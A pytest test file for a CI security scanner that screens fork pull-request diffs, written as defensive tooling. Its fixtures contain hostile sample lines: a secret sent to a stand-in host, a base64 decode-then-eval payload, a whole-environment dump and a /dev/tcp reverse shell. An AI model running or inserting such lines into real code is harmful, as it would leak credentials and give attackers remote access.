from __future__ import annotations

import os
import subprocess
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[2]
SCRIPT = REPO_ROOT / ".github/scripts/fork-e2e/security_scan.py"


def _run(tmp_path: Path, diff: str) -> dict[str, str]:
    """
    Run security_scan.py over a unified-diff string and return its outputs.

    :param tmp_path: Pytest tmp dir for the diff + GITHUB_OUTPUT files.
    :param diff: Unified-diff text (as ``gh pr diff --patch`` would emit).
    :returns: Parsed ``key=value`` GITHUB_OUTPUT lines, e.g.
        ``{"clean": "true", "summary": "clean"}``.
    """
    diff_file = tmp_path / "pr.diff"
    diff_file.write_text(diff)
    out_file = tmp_path / "gh_output"
    out_file.touch()
    env = os.environ.copy()
    env["GITHUB_OUTPUT"] = str(out_file)
    proc = subprocess.run(
        [sys.executable, str(SCRIPT), str(diff_file)],
        env=env,
        capture_output=True,
        text=True,
        timeout=30,
    )
    assert proc.returncode == 0, f"script failed: {proc.stderr}"
    outputs: dict[str, str] = {}
    for line in out_file.read_text().splitlines():
        if "=" in line:
            key, _, value = line.partition("=")
            outputs[key] = value
    return outputs


def _diff(path: str, added: list[str]) -> str:
    """
    Build a minimal unified diff that ADDS *added* lines to *path*.

    :param path: Destination file path, e.g. ``"tests/e2e/conftest.py"``.
    :param added: Line bodies to mark as added (no leading ``+``).
    :returns: A unified-diff string the scanner can parse.
    """
    body = "".join(f"+{ln}\n" for ln in added)
    return (
        f"diff --git a/{path} b/{path}\n"
        f"index 1111111..2222222 100644\n"
        f"--- a/{path}\n"
        f"+++ b/{path}\n"
        f"@@ -1,1 +1,{len(added) + 1} @@\n"
        f" context\n"
        f"{body}"
    )


def test_benign_diff_is_clean(tmp_path: Path) -> None:
    """A normal test addition (no exfil, no CI-bootstrap file) scans clean.

    Guards against the gate blocking ordinary contributions. Asserts
    ``clean=true`` for an unremarkable new test file.
    """
    out = _run(tmp_path, _diff("tests/test_math.py", ["def test_add():", "    assert 1 + 1 == 2"]))
    assert out["clean"] == "true"


def test_secret_source_plus_network_blocks(tmp_path: Path) -> None:
    """Reading a secret-named cred AND a network sink in one file blocks.

    The canonical exfil shape. Asserts ``clean=false`` and that the summary
    names the file.
    """
    out = _run(
        tmp_path,
        _diff(
            "tests/e2e/conftest.py",
            [
                "import requests, os",
                "requests.post('http://x', data=os.environ['DATABRICKS_CLIENT_SECRET'])",
            ],
        ),
    )
    assert out["clean"] == "false"
    assert "conftest.py" in out["summary"]


def test_decode_then_exec_blocks(tmp_path: Path) -> None:
    """A decode-then-exec payload blocks even without a network sink.

    ``eval(base64.b64decode(...))`` is almost never legitimate. Asserts
    ``clean=false``.
    """
    out = _run(
        tmp_path,
        _diff("setup.py", ["import base64", "eval(base64.b64decode('cHduZWQ='))"]),
    )
    assert out["clean"] == "false"


def test_environ_dump_blocks(tmp_path: Path) -> None:
    """Serializing the whole environment blocks (wholesale-secret exfil).

    ``json.dumps(os.environ)`` is a classic dump-everything sink. Asserts
    ``clean=false``.
    """
    out = _run(
        tmp_path,
        _diff(
            "tests/conftest.py",
            ["import json, os", "open('/tmp/x','w').write(json.dumps(os.environ))"],
        ),
    )
    assert out["clean"] == "false"


def test_reverse_shell_blocks(tmp_path: Path) -> None:
    """A /dev/tcp reverse-shell shape blocks. Asserts ``clean=false``."""
    out = _run(
        tmp_path,
        _diff(
            "tests/conftest.py",
            ["import os", "os.system('bash -i >& /dev/tcp/1.2.3.4/9001 0>&1')"],
        ),
    )
    assert out["clean"] == "false"


def test_normal_gateway_test_not_blocked(tmp_path: Path) -> None:
    """Using LLM_API_KEY + a network call (a normal e2e test) does NOT block.

    Low-false-positive guard: the LLM key is not a secret-NAMED source, so an
    ordinary gateway test that reads it and makes a request scans clean. Asserts
    ``clean=true``.
    """
    out = _run(
        tmp_path,
        _diff(
            "tests/e2e/test_gateway.py",
            [
                "import requests, os",
                "key = os.environ['LLM_API_KEY']",
                "requests.get(GATEWAY)  # normal e2e",
            ],
        ),
    )
    assert out["clean"] == "true"


def test_ci_file_touch_is_info_not_blocking(tmp_path: Path) -> None:
    """A benign edit to a CI-executed file is INFO (clean), not blocking.

    Editing conftest.py / .github without an exfil pattern should surface a
    note for the reviewer but not withhold the mirror. Asserts ``clean=true``
    and that the summary records a CI-file note.
    """
    out = _run(tmp_path, _diff("tests/conftest.py", ["# add a harmless fixture comment"]))
    assert out["clean"] == "true"
    assert "note" in out["summary"]


def test_passing_environ_around_not_blocked(tmp_path: Path) -> None:
    """Passing os.environ to a helper (no dump) does NOT block.

    Regression for review feedback: a bare ``os.environ)`` matched benign
    ``helper(os.environ)`` and withheld the mirror. Only a wholesale dump
    (``json.dumps(os.environ)`` etc.) should block. Asserts ``clean=true``.
    """
    out = _run(tmp_path, _diff("tests/conftest.py", ["import os", "configure_app(os.environ)"]))
    assert out["clean"] == "true"


def test_generic_access_token_field_not_blocked(tmp_path: Path) -> None:
    """A generic ``access_token`` field + a network call does NOT block.

    Regression for review feedback: a case-insensitive ``ACCESS_TOKEN`` term
    matched ordinary OAuth/JSON ``access_token`` identifiers and, combined with
    any network use, withheld the mirror. Asserts ``clean=true``.
    """
    out = _run(
        tmp_path,
        _diff(
            "tests/test_oauth.py",
            ["access_token = resp.json()['access_token']", "requests.get(url, headers=h)"],
        ),
    )
    assert out["clean"] == "true"
